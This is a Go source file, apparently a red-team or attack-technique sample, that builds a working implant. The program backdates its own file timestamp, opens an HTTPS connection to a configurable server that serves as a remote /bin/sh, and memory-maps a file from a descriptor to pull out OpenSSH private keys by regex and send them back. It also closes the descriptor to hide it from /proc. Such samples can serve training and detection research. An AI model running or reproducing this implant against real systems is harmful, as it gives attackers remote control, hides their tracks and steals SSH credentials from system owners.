// Program change_own_timestamp - map_and_regex_file_descriptor but changes
// argv[0]'s timestamp to a week earlier.
package main

/*
 * change_own_timestamp.go
 * map_and_regex_file_descriptor with timestomping
 * By J. Stuart McMurray
 * Created 20240907
 * Last Modified 20240907
 */

import (
	"cmp"
	"context"
	"errors"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"syscall"
	"time"
)

// Compile-time configurables
var (
	Address           = "https://localhost:4444/shell"
	AddressEnvVar     = "ALPT4ATS_ADDRESS"
	RealAddressEnvVar = "ALPT4ATS_REAL_ADDRESS"
)

const (
	// ConfFD is the file descriptor from which we might read our config.
	ConfFD = 7
	// FileFD is the file descriptor for a file to send back to the server.
	FileFD = 8
	// MaxKeys is the maximum number of key's we'll exfil.
	MaxKeys = 1024
	// TimestampOffset is how long from now to set argv[0]'s timestamp.
	TimestampOffset = -168 * time.Hour
)

// KeyRE finds us an SSH key, hopefully without too much fuss.
var KeyRE = regexp.MustCompile(
	`-----BEGIN OPENSSH PRIVATE KEY-----` +
		`[ -~\r\n\t]{10,1000}?` +
		`[ -~\r\n\t]{10,1000}?` +
		`[ -~\r\n\t]{10,1000}?` +
		`[ -~\r\n\t]{10,1000}?` +
		`-----END OPENSSH PRIVATE KEY-----`,
)

func main() {
	/* Change our own timestamp to some time in the past. */
	when := time.Now().Add(TimestampOffset)
	if err := os.Chtimes(os.Args[0], when, when); nil != err {
		log.Printf("Could not change our own timestamp: %s", err)
	}

	/* Config from environment overrides compile-time config. */
	Address = cmp.Or(os.Getenv(AddressEnvVar), Address)

	/* Config from file descriptor 7 overrides config from environment. */
	if _, err := fmt.Fscan(
		os.NewFile(uintptr(ConfFD), "config"),
		&Address,
	); nil != err && !errors.Is(err, io.EOF) &&
		!errors.Is(err, syscall.EBADF) {
		log.Fatalf("Error reading config from FD %d: %s", ConfFD, err)
	}

	/* Don't do DNS resolution if we have a real address already. */
	if ra, ok := os.LookupEnv(RealAddressEnvVar); ok {
		dial := func(
			ctx context.Context,
			network, addr string,
		) (net.Conn, error) {
			return (&net.Dialer{}).DialContext(ctx, network, ra)
		}
		http.DefaultTransport.(*http.Transport).DialContext = dial
	}

	/* Connect to the server. */
	pr, pw := io.Pipe()
	res, err := http.Post(Address, "", pr)
	if nil != err {
		log.Fatalf("HTTPS request error: %s", err)
	}

	/* Map the file into memory and extract SSH keys via regex. */
	go mapFDAndExfilKeys(pw, FileFD)

	/* Spawn a shell. */
	sh := exec.Command("/bin/sh")
	sh.Stdin = res.Body
	sh.Stdout = pw
	sh.Stderr = pw
	if err := sh.Run(); nil != err {
		log.Fatalf("Shell died: %s", err)
	}
}

// mapFDAndExfilKeys maps fd into memory, closes fd, extracts all of the SSH
// keys it can via regex, and sends them back.  The mapped file is unmapped
// before returning.
func mapFDAndExfilKeys(w io.Writer, fd int) {
	/* Work out how big it is. */
	sz, err := syscall.Seek(fd, 0, io.SeekEnd)
	if nil != err {
		fmt.Fprintf(w, "Unable to seek to end of fd %d: %s\n", fd, err)
		return
	}

	/* Map it into memory. */
	b, err := syscall.Mmap(
		fd,
		0,
		int(sz),
		syscall.PROT_READ,
		syscall.MAP_SHARED,
	)
	if nil != err {
		fmt.Fprintf(w, "Unable to map fd %d into memory: %s", fd, err)
		return
	}

	/* No need to leave it hanging around in /proc/pid/fd. */
	syscall.Close(fd)

	/* Extract and exfil keys. */
	for _, key := range KeyRE.FindAll(b, MaxKeys) {
		fmt.Fprintf(w, "%s\n", key)
	}

	/* Unmap the file when we're done with it. */
	syscall.Munmap(b)
}
